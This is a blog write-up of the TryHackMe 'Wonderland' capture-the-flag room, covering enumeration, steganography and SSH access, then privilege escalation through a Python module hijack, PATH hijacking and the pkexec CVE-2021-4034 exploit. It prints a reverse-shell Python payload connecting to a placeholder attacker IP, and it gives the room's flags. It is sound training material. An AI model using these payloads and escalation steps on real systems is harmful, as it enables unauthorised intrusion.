---
title: "Wonderland"
date: 2025-03-28
image: /assets/img/tryhackme/Wonderland/Wonderland_image.jpg
description: Writeup of the TryHackMe-CTF Wonderland
categories: [TryHackMe, Medium]
tags: [linux, steganography, python, pathmanipulation, pkexec]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Wonderland</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Fall down the rabbit hole and enter wonderland.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/wonderland">https://tryhackme.com/room/wonderland</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Wonderland.

## Enumeration
I started the enumeration using `nmap`:
```bash
kali@kali:~/ctf/wonderland$ nmap -p- 10.10.87.79
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-28 06:45 EDT
  Nmap scan report for 10.10.87.79
  Host is up (0.039s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 36.96 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
kali@kali:~/ctf/wonderland$ nmap -A -p 22,80 10.10.87.79
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-28 06:46 EDT
  Nmap scan report for 10.10.87.79
  Host is up (0.038s latency).

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
  |   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
  |_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
  80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
  |_http-title: Follow the white rabbit.
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 13.56 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The website displayed a quote of Alice in Wonderland. I initiated a Gobuster directory enumeration and manually began exploring the website. My attention was caught by an image of the `Märzhase` (March Hare in English), which had a `JPG` extension. After downloading the image, I applied some steganography techniques and was successful using `steghide`:
```bash
kali@kali:~/ctf/wonderland$ steghide --extract -sf white_rabbit_1.jpg 
Enter passphrase: 
wrote extracted data to "hint.txt".
                
kali@kali:~/ctf/wonderland$ cat hint.txt  
follow the r a b b i t
```

Once the Gobuster directory enumeration was complete, I had a strong sense of where this might lead:
```bash
kali@kali:~/ctf/wonderland$ gobuster dir --url http://10.10.87.79/ --wordlist /usr/share/wordlists/dirb/common.txt -x txt,html,php 

  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.87.79/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,html,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /img                  (Status: 301) [Size: 0] [--> img/]
  /index.html           (Status: 301) [Size: 0] [--> ./]
  /index.html           (Status: 301) [Size: 0] [--> ./]
  /r                    (Status: 301) [Size: 0] [--> r/]
  Progress: 18456 / 18460 (99.98%)
  ===============================================================
  Finished
  ===============================================================
```

I entered the URL in the following format:
```html
http://10.10.87.79/r/a/b/b/i/t/
```

The website displayed another image, but this time it was a `.png` file. I continued analyzing the page source and found something interesting:
```html
<p style="display: none;">alice:H[removed]l</p>
```

This appeared to be a set of credentials. I attempted to log in via SSH, which was successful:
```bash
kali@kali:~/ctf/wonderland$ ssh alice@10.10.87.79 
alice@wonderland:~$ id
  uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

The `user.txt` was not inside the home directory, so I analyzed which users were present:
```bash
  [...]
  tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
  alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
  hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
  rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
  [...]
```

## Privilege Escalation rabbit

Alice was allowed to run a Python script as user 'rabbit', so I proceeded to enumerate the script further:
```bash
alice@wonderland:/home$ sudo -l 
  Matching Defaults entries for alice on wonderland:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User alice may run the following commands on wonderland:
      (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

alice@wonderland:~$ cat walrus_and_the_carpenter.py 
  import random

  [... a lot of poems ...]

  for i in range(10):
      line = random.choice(poem.split("\n"))
      print("The line was:\t", line)
```

The imported `random` library caught my attention. To exploit this, I set the `PYTHONPATH` variable to Alice's home directory and created a file named `random.py`. This file was  imported by `walrus_and_the_carpenter.py`. My `random.py` script contained a reverse shell, which I successfully received triggered upon executing the script.
```bash
alice@wonderland:~$ cat random.py 
  import socket,subprocess,os,pty

  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[attacker-ip]",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
  pty.spawn("bash")
alice@wonderland:~$ export PYTHONPATH=/home/alice
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```

## Privilege Escalation hatter

In the `rabbit`'s user directory, I found a binary named `teaParty`. I executed it and received the following output:
```bash
rabbit@wonderland:/home/rabbit$ ./teaParty 
  Welcome to the tea party!
  The Mad Hatter will be here soon.
  Probably by Fri, 28 Mar 2025 12:30:40 +0000
  Ask very nicely, and I will give you some tea while you wait for him
  ok
  Segmentation fault (core dumped)
```

For further analysis, I downloaded the binary to my machine and loaded it in IDA. I discovered that the `date` command was used without reverencing the full path:

![IDA](/assets/img/tryhackme/Wonderland/thm_wonderland_1.jpg)

To exploit this, I created a binary called `date`, which spawns a shell. After modifying the PATH variable and executing `teaParty` again, I successfully escalated to user `hatter`.
```bash
rabbit@wonderland:/home/rabbit$ ed /tmp
rabbit@wonderland:/tmp$ echo "/bin/bash" > date
rabbit@wonderland:/tmp$ chmod 777 date
rabbit@wonderland:/tmp$ export PATH=/tmp:$PATH
rabbit@wonderland:/tmp$ cd /home/rabbit
rabbit@wonderland:~$ ./teaParty
  Welcome to the tea party!
  The Mad Hatter will be here soon.
  Probably by hatter@wonderland:/home/rabbit$
hatter@wonderland:~$ id
  uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
```

Once I gained access to the `hatter` user, I enumerated the home directory and found the user's. However, I was not permitted to run `sudo -l`:
```bash
hatter@wonderland:~$ cat password.txt 
  W[removed]?
hatter@wonderland:~$ sudo -l
  [sudo] password for hatter: 
  Sorry, user hatter may not run sudo on wonderland.
```

## Privilege Escalation root

Next, I checked for SUID bits and discoverd that `pkexec` had its SUID bit set. I used the exploit described in <a href="https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py">CVE-2021-4034</a> and successfully gained root access:


```bash
rabbit@wonderland:/home/rabbit$ python3 exploit.py 
  Do you want to choose a custom payload? y/n (n use default payload)  n
  [+] Cleaning pervious exploiting attempt (if exist)
  [+] Creating shared library for exploit code.
  [+] Finding a libc library to call execve
  [+] Found a library at <CDLL 'libc.so.6', handle 7fe114abf000 at 0x7fe1135697b8>
  [+] Call execve() with chosen payload
  [+] Enjoy your root shell
# id
  uid=0(root) gid=1002(rabbit) groups=1002(rabbit)
# cat /root/user.txt
  thm{"Curiouser and curiouser!"}
# cat /home/alice/root.txt
  thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

solved! :)